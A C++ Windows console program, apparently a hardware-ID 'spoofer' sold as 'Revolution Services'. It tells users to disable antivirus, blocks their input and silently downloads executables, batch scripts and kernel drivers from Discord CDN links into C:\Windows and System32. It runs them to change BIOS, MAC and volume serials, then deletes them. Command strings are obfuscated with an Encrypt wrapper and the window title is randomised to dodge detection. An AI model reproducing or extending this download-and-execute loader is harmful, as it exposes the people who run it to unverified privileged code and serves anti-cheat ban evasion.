#include <iostream>
#include <Windows.h>
#include <iostream>
#include <Windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <ctime>
#include <random>  // Added for std::random_device and std::uniform_int_distribution
#include "Encrypt.h"

#include <conio.h>



// Define Shit
#define color SetConsoleTextAttribute
#define LI_FN __declspec(dllimport)


HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);


using namespace std; //shit to add for loader



//definition of lower, and higher number (constant until changed)
const int AnyNumber = 10;
const int AnyLowerNumber = 10;

std::string Random(std::string::size_type length)
{
    static auto& chrs = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    thread_local static std::mt19937 rg{ std::random_device{}() };
    thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);
    std::string s;
    s.reserve(length);
    while (length--)
        s += chrs[pick(rg)];
    return s;
}

// Define RandomTitle before main
auto RandomTitle = [](int iterations) {
    std::string Title;
    for (int i = 0; i < iterations; i++)
        Title += rand() % 255 + 1;
    return Title;
    };

std::string RandomVolumeID(std::string::size_type length)
{
    static auto& chrs = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    thread_local static std::mt19937 rg{ std::random_device{}() };
    thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);
    std::string s;
    s.reserve(length);
    while (length--)
        s += chrs[pick(rg)];
    return s;
}

struct slowly_printing_string {
    std::string data;
    double delay;  // Use double for more precise delays
};

std::ostream& operator<<(std::ostream& os, const slowly_printing_string& str) {
    for (char c : str.data) {
        os << c << std::flush;
        std::this_thread::sleep_for(std::chrono::duration<double, std::milli>(str.delay)); // Use std::duration with double
    }
    return os;
}
//void function to update title
void UpdateConsoleTitle() {
    while (true) {
        SetConsoleTitleA(RandomTitle(rand() % AnyNumber + AnyLowerNumber).c_str());
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

void Console() //hies scroll bar
{
    HWND console = GetConsoleWindow();
    if (console != NULL)
    {
        DWORD style = GetWindowLong(console, GWL_STYLE);
        style = style & ~(WS_VSCROLL | WS_HSCROLL);
        SetWindowLong(console, GWL_STYLE, style);
        SetWindowPos(console, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_FRAMECHANGED);
    }
}

void Cursor(bool showFlag)
{
    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_CURSOR_INFO cursorInfo;
    GetConsoleCursorInfo(out, &cursorInfo);
    cursorInfo.bVisible = showFlag;
    SetConsoleCursorInfo(out, &cursorInfo);
}

bool IsKeyPressed(int key)
{
    return GetAsyncKeyState(key) & 0x8000;
}


int main()
{

    HWND console = GetConsoleWindow();
    Console();
    Cursor(false);

    std::thread titleUpdater(UpdateConsoleTitle);

    color(hConsole, 5);
    HWND hWnd = GetConsoleWindow();
    DWORD windowStyle = (DWORD)GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED;
    SetWindowLong(hWnd, GWL_EXSTYLE, windowStyle);
    SetLayeredWindowAttributes(hWnd, 0, 200, LWA_ALPHA);

Menu:


    Console();
    Cursor(false);
    system(("cls"));
    color(hConsole, 3);

    std::cout << slowly_printing_string{ R"(  
 _____                 _       _   _                _____                 _               
|  __ \               | |     | | (_)              / ____|               (_)              
| |__) |_____   _____ | |_   _| |_ _  ___  _ __   | (___   ___ _ ____   ___  ___ ___  ___ 
|  _  // _ \ \ / / _ \| | | | | __| |/ _ \| '_ \   \___ \ / _ \ '__\ \ / / |/ __/ _ \/ __|
| | \ \  __/\ V / (_) | | |_| | |_| | (_) | | | |  ____) |  __/ |   \ V /| | (_|  __/\__ \
|_|  \_\___| \_/ \___/|_|\__,_|\__|_|\___/|_| |_| |_____/ \___|_|    \_/ |_|\___\___||___/                                                                                                                                                                                    
                                                )", 0.0001 } << "\n";
    color(hConsole, 4);
    std::cout << slowly_printing_string{ "[!]Make Sure Your AntiVirus Is Turned OFF", 5 } << "\n\n";


    color(hConsole, 7);
    std::cout << slowly_printing_string{ "[" ,10 };
    color(hConsole, 2);
    std::cout << slowly_printing_string{ "1" ,10 };
    color(hConsole, 7);
    std::cout << slowly_printing_string{ "]Permentantely Spoof \n", 10 };
    color(hConsole, 7);
    std::cout << slowly_printing_string{ "[" ,10 };
    color(hConsole, 2);
    std::cout << slowly_printing_string{ "2" ,10 };
    color(hConsole, 7);
    std::cout << slowly_printing_string{ "]Check Serials \n", 10 };
    color(hConsole, 7);
    std::cout << slowly_printing_string{ "[" ,10 };
    color(hConsole, 2);
    std::cout << slowly_printing_string{ "3" ,10 };
    color(hConsole, 7);
    std::cout << slowly_printing_string{ "]Exit \n\n", 10 };
    std::cout << slowly_printing_string{ "Select: ", 10 };
    int option; //option vairable
    std::cin >> option; //looks for option and stores in variable above
    switch (option)//takes the variable and looks for options below.
    {
        case 1
        :goto spoof;

            case 2
            :goto Checker;

                case 3
                :goto Exit;
    }
spoof:
    {
        {
            system(Encrypt("cls").decrypt());
            //std::cout << (Encrypt("This window will be Hidden for a couple of sec").decrypt()) << std::endl;
            //ShowWindow(console, SW_HIDE);
            BlockInput(true);
            system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1185313104968560762/Mac.bat --output C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
            system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1188523060593184808/1195841938914553856/AMIDEWINx64.EXE --output C:\\Windows\\GameBarPresenceWriter\\AMIDEWINx64.EXE >nul").decrypt());
            system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1188523060593184808/1195841954202791946/amifldrv64.sys --output C:\\Windows\\GameBarPresenceWriter\\amifldrv64.sys >nul").decrypt());
            system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1188523060593184808/1195841966022332558/amigendrv64.sys --output C:\\Windows\\GameBarPresenceWriter\\amigendrv64.sys >nul").decrypt());
            system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1188523060593184808/1195855032634065016/AmiSpoof.bat --output C:\\Windows\\GameBarPresenceWriter\\AmiSpoof.bat >nul").decrypt());
            system("curl --silent https://cdn.discordapp.com/attachments/1194193490616266864/1196831064753180693/Volumeid.exe --output C:\\Windows\\System32\\Volumeid.exe >nul 2>&1");
            system("curl --silent https://cdn.discordapp.com/attachments/1194193490616266864/1196832062196416652/Volumeid64.exe --output C:\\Windows\\Volumeid64.exe >nul 2>&1");
            Sleep(2000);
            system(Encrypt("C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
            system(Encrypt("C:\\Windows\\GameBarPresenceWriter\\AmiSpoof.bat").decrypt());
            system(Encrypt("C:\\Windows\\Volumeid64.exe").decrypt());
            system(("C:\\Windows\\System32\\Volumeid.exe C:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());
            system(("C:\\Windows\\System32\\Volumeid.exe D:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());
            system(("C:\\Windows\\System32\\Volumeid.exe E:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());
            Sleep(2000);
            system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
            system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\AMIDEWINx64.EXE >nul").decrypt());
            system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\amifldrv64.sys >nul").decrypt());
            system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\amigendrv64.sys >nul").decrypt());
            system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\AmiSpoof.bat >nul").decrypt());
            system(Encrypt("del C:\\Windows\\System32\\Volumeid.exe"));
            system("del C:\\Windows\\Volumeid64.exe");
            system(Encrypt("cls").decrypt());
            BlockInput(false);
            //ShowWindow(console, SW_SHOW);
            printf(Encrypt("\n\n    Spoofed.. Returning 5 Seconds...").decrypt());
            Sleep(5000);
            goto Menu;
        }
    }
Checker:
    {
        system(Encrypt("cls").decrypt());
        std::cout << (Encrypt("BaseBoard: \n").decrypt());
        system(Encrypt("wmic baseboard get serialnumber").decrypt());
        std::cout << (Encrypt("BIOS: \n").decrypt());
        system(Encrypt("wmic bios get serialnumber").decrypt());
        std::cout << (Encrypt("CPU: \n").decrypt());
        system(Encrypt("wmic cpu get serialnumber \n").decrypt());
        std::cout << (Encrypt("Chassis: \n").decrypt());
        system(Encrypt("wmic systemenclosure get serialnumber \n").decrypt());
        std::cout << (Encrypt("Press Any Key To Return..").decrypt());
        system(Encrypt("pause >nul").decrypt());
        goto Menu;
    }
Exit:
    {
        system(Encrypt("cls").decrypt());
        __fastfail(0);
    }






}




